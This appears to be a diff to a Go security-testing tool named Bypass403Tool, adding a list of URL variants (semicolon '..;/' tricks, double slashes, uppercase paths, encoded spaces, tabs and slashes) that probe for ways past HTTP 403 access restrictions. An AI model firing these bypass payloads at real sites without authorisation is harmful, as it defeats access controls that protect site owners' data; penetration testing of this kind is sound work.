@@ -73,11 +73,25 @@ func (t *Bypass403Tool) Run(ctx context.Context, targets []string, threads int) 
 		var events []Event
 		var mu sync.Mutex
 
-		// 1. Test Path Normalizations
+		// 1. Test Path Normalizations and encoding bypasses
+		path := parsed.Path
 		pathBypasses := []string{
+			// Trailing slash / dot
 			target + "/",
 			target + "/./",
-			parsed.Scheme + "://" + parsed.Host + "/..;" + parsed.Path,
+			target + "/.",
+			// Semicolon bypass (Tomcat/Spring)
+			target + "..;/",
+			parsed.Scheme + "://" + parsed.Host + "/..;" + path,
+			// Double slash in path
+			parsed.Scheme + "://" + parsed.Host + "//" + strings.TrimPrefix(path, "/"),
+			// Case variation (uppercase)
+			parsed.Scheme + "://" + parsed.Host + strings.ToUpper(path),
+			// URL-encoded space and tab
+			parsed.Scheme + "://" + parsed.Host + path + "%20",
+			parsed.Scheme + "://" + parsed.Host + path + "%09",
+			// Encoded slash prefix
+			parsed.Scheme + "://" + parsed.Host + "/%2f" + strings.TrimPrefix(path, "/"),
 		}
 
 		for _, bypassURL := range pathBypasses {
